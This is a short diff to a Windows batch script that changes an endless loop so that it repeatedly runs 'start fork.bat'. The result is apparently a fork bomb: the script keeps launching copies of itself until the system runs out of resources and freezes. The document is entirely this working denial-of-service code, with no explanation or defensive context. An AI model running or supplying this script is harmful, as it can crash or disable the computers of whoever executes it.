@@ -1,5 +1,5 @@
 @echo off
 cls
 a:
-start
+start fork.bat
 goto a
